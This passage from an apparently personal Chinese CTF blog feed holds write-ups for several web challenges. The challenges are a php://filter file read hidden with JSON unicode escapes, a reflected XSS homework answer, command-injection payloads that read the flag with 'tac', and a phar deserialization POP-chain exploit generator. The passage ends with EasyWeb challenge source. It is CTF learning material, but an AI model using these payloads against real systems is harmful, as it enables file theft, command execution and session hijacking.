class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre></code></pre><p>以json的格式post数据，读取flag文件        </p><p>json中可以用utf-16编码       </p><p>php—-&gt;<code>\u0070\u0068\u0070</code><br>flag—–&gt;<code>\u0066\u006C\u0061\u0067</code>       </p><p>伪协议读取即可        </p><p>payload：<code>&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070://filter/read=convert.Base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;&#125;</code></p><p><img src="https://ae04.alicdn.com/kf/Uc0dae37fec114059ba662aef6c3440a4s.jpg" alt="01.png"></p><hr><hr><p><img src="https://ae03.alicdn.com/kf/U077aee7bf14d4989834bd3d5c060ab95X.jpg" alt="我是伞兵">    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nep1</title>
    <link href="/2021/04/16/nep1/"/>
    <url>/2021/04/16/nep1/</url>
    
    <content type="html"><![CDATA[<h2 id="—-—"><a href="#—-—" class="headerlink" title="—__—"></a>—__—</h2><p>1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）      </p><pre><code>Burp Proxy-----拦截HTPP(s)请求，抓包，修改请求，发包......        Firefox-----好用的开发人员工具......</code></pre><p>2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）</p><pre><code>攻要找一点，防要找全部      对应用程序的每个按钮都看看，并思考程序可能被攻击的方式</code></pre><p>3.审计以下代码：</p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token single-quoted-string string">' name '</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;h1>Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span> !&lt;/h1>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter your name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span> submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></code></pre><p>本段代码涉及到客户端，服务端以及通信协议。<br>运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释</p><p>通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET</p><p>运行在服务端的代码为php，由php核心负责解释。</p><p>用户端与服务端通过HTTP通信协议进行交互。</p><p>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）</p><pre><code>html部分属于客户端的内容，PHP部分属于服务端的内容</code></pre><p>客户端是通过传递什么参数来控制服务端代码的？（1分）</p><pre><code>name</code></pre><p>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）</p><pre><code>反射型xss提交name=&lt;script&gt;alert(1)&lt;/script&gt;后查看页面源代码，发现插入了&lt;script&gt;标签并被网页解析       </code></pre><p><img src="https://ae04.alicdn.com/kf/U20e43d350dcd492c8cd41f983b285f5dw.jpg" alt="01.png"></p><p>4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）</p><pre><code>在网站中插入XSS获得管理员cookie，登录后台管理页面.......       过滤标签，HTTP-only</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyBypass</title>
    <link href="/2021/04/15/BUU70/"/>
    <url>/2021/04/15/BUU70/</url>
    
    <content type="html"><![CDATA[<h2 id="………"><a href="#………" class="headerlink" title="………"></a>………</h2><p>代码审计     </p><p><img src="https://ae04.alicdn.com/kf/U81afd0c96ea04194babb7ddac8d9d8acR.jpg" alt="01.png">     </p><p>应该注意到comm1中没有过滤<code>tac</code>     </p><p>flag被过，可以用通配符<code>f???</code>      </p><p>一开始觉得用<code>;</code>把file毙了就行了，但我忽略了     </p><pre><code>$comm1 = &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;$comm2 = &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;</code></pre><p>还应该闭合双引号         </p><p>payload：<code>?comm1=&quot;;tac /f???;&quot;</code><br>payload：<code>?comm1=&quot;;tac /fl\ag;&quot;</code><br>之前遇到过这个，两个<code>\\</code>过滤不了<code>\</code>，因为要经过PHP和正则两层解析，最后匹配的是个<code>|</code><br><img src="https://ae04.alicdn.com/kf/U20fbfe11e83c4e30a3043885763b63b9L.jpg" alt="02.png"><br>file闭合，命令执行           </p><p>这样一道题在本地试了半天，太菜了        </p><p>###Linux通配符     </p><pre><code>|     #管道符，或者（正则）   #命令1 | 命令2，命令1的结果传递给命令2&gt;     #输出重定向   #清空原文内容，然后向文件里追加内容&gt;&gt;    #输出追加重定向   #追加到文件最后一行&lt;     #输入重定向&lt;&lt;    #追加输入重定向~     #当前用户家目录`` $() #引用命令被执行后的结果$     #以。。。结尾（正则）^     #以。。。开头（正则）*     #匹配0或多个字符，通配符？    #任意一个字符，通配符#       #注释&amp;       #让程序或脚本切换到后台执行&amp;&amp;      #并且 同时成立[]      #表示一个范围（正则，通配符）&#123;&#125;      #产生一个序列（通配符）.       #当前目录的硬链接..      #上级目录的硬链接</code></pre><p><img src="https://ae03.alicdn.com/kf/U7a5bcd1aa2484b7d9ee175e7b557cd0dt.jpg" alt="03.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SimplePHP</title>
    <link href="/2021/04/13/BUU69/"/>
    <url>/2021/04/13/BUU69/</url>
    
    <content type="html"><![CDATA[<h2 id="‘-’"><a href="#‘-’" class="headerlink" title="‘__’"></a>‘__’</h2><p><img src="https://ae03.alicdn.com/kf/Ub16431fd83624f07b158ba34f22c3a5c8.jpg" alt="01.png">      </p><p>一开始上传文件，试了一波，感觉不行<br>查看文件里也没有上传的文件，url变成了这<code>http://c8f4d1a6-6922-4386-b8ad-5454fdc52a38.node3.buuoj.cn/file.php?file=</code>感觉可以伪协议读取一波文件，网页注释中<code>flag is in f1ag.php</code>但没法直接读flag，但读不出来，看了WP，后面直接加文件名就行了，不用伪协议。。。。。。。。。。。。。。          </p><p><code>index.php</code>       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token single-quoted-string string">'base.php'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> ``` `base.php`       ![02.png](https://ae02.alicdn.com/kf/Ucdb358cbcd1143c9900976dbb1f9fd8aL.jpg)       `file.php`      ![03.png](https://ae03.alicdn.com/kf/U376206dfb980446d9bfe46fee0ea095d9.jpg)        `function.php`      ![04.png](https://ae03.alicdn.com/kf/Ud189e385babc4686ab45f6222c6dfaeaK.jpg)       `class.php`        ```php <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><p>主要就是这个class.php<br>没有<code>unserialize</code><br>应该是phar了<br>看一下，没过滤         </p><p>pop链<br><code>C1e4r-&gt;__destruct-&gt;Show-&gt;__toString-&gt;Test-&gt;__get-&gt;get()</code>        </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token double-quoted-string string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c1e4r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//.phar文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//固定的</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c1e4r</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发的头是C1e4r类，所以传入C1e4r对象</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//随便写点什么生成个签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>生成的phar文件后缀改为<code>array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;)之中的</code><br>上传<br><code>/upload/</code>—–&gt;目录开着（还可以这样。。。）<br><img src="https://sc04.alicdn.com/kf/U7ef653ef22384f92b3c62d63c9147bf27.jpg" alt="06.png"><br>复制文件名，访问即可得到flag<br><img src="https://ae03.alicdn.com/kf/U8f7e66d8be4549688e1d94f262ca86f6I.jpg" alt="05.png">      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyWeb</title>
    <link href="/2021/04/12/BUU68/"/>
    <url>/2021/04/12/BUU68/</url>
    
    <content type="html"><![CDATA[<h2 id="n-A-n"><a href="#n-A-n" class="headerlink" title="n_A_n"></a><code>n_A_n</code></h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token shell-comment comment">##文件后缀</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token boolean constant">False</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">##文件中过滤了&lt;?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">##头文件检测</span>        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>```      数字，字母都被过了，用异或       